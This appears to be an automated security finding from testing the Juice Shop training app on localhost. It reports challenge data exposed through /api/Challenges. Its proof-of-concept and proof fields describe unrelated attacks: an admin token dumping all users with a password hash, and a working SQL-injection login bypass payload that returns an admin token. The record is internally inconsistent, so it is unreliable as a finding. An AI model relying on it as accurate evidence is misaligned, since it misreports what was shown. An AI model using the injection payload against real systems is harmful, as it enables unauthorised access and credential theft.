title: Challenge Data Exposure via API
description: The /api/Challenges endpoint exposes all CTF challenge definitions including descriptions, difficulty levels, category tags, and solved status booleans. This allows attackers to enumerate all challenges and their status.
poc: Probe request against GET http://127.0.0.1:3010/api/Challenges; observed proving result from prior stage handoff: GET /api/Users with admin JWT returned all users including password hashes (e.g. "password":"0192023a7bbd73250516f069df18b500"), emails, roles for 24 users
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
